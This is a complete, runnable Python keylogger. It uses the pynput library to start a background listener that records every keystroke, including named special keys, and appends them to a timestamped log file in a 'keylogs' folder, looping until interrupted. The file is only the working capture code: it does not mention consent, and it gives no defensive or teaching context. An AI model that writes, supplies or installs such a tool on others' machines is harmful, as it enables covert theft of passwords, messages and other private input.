from pynput import keyboard
from datetime import datetime
import os

# Create a folder to store logs
LOG_DIR = "keylogs"
os.makedirs(LOG_DIR, exist_ok=True)

# Create a unique file for this session
start_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
log_file = os.path.join(LOG_DIR, f"keylog_{start_time}.txt")

# Capture keystrokes
def on_press(key):
    try:
        k = key.char
    except AttributeError:
        k = f"[{key.name}]"
    with open(log_file, "a") as f:
        f.write(k)

# Start background listener
keyboard.Listener(on_press=on_press).start()

# Keep script alive
try:
    while True:
        pass
except KeyboardInterrupt:
    print("Stopped.")
